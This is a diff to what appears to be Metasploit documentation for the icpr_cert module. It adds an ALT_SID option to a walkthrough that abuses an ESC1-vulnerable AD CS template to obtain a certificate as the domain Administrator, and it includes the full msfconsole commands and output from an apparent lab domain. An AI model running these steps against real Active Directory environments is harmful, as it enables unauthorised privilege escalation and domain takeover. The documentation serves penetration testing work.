@@ -335,9 +335,9 @@ With this we now have a list of certificates that can be utilized for privilege 
 
 # Using the ESC1 Vulnerability To Get a Certificate as the Domain Administrator
 Getting a certificate as the current user is great, but what we really want to do is elevate privileges if we can.
-Luckily we can also do this with the `icpr_cert` module. We just need to also set the `ALT_UPN` option to specify who we
-would like to authenticate as instead. Note that this only works with ESC1 vulnerable certificate templates which is why
-we can do this here.
+Luckily we can also do this with the `icpr_cert` module. We just need to also set the `ALT_SID` and `ALT_UPN` options to
+specify who we would like to authenticate as instead. Note that this only works with certificate templates that are
+vulnerable to ESC1 due to having the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag set.
 
 If we know the domain name is `daforest.com` and the domain administrator of this domain is named `Administrator` we can
 quickly set this up:
@@ -356,6 +356,8 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
 SMBPass => normalpass
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
 SMBUser => normaluser
+msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_SID S-1-5-21-3402587289-1488798532-3618296993-1000
+ALT_SID => S-1-5-21-3402587289-1488798532-3618296993-1000
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set ALT_UPN Administrator@daforest.com
 ALT_UPN => Administrator@daforest.com
 msf6 auxiliary(admin/dcerpc/icpr_cert) > run
@@ -363,6 +365,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 
 [*] 172.30.239.85:445 - Requesting a certificate...
 [+] 172.30.239.85:445 - The requested certificate was issued.
+[*] 172.30.239.85:445 - Certificate SID: S-1-5-21-3402587289-1488798532-3618296993-1000
 [*] 172.30.239.85:445 - Certificate UPN: Administrator@daforest.com
 [*] 172.30.239.85:445 - Certificate stored at: /home/gwillcox/.msf4/loot/20221216143830_default_unknown_windows.ad.cs_338144.pfx
 [*] Auxiliary module execution completed
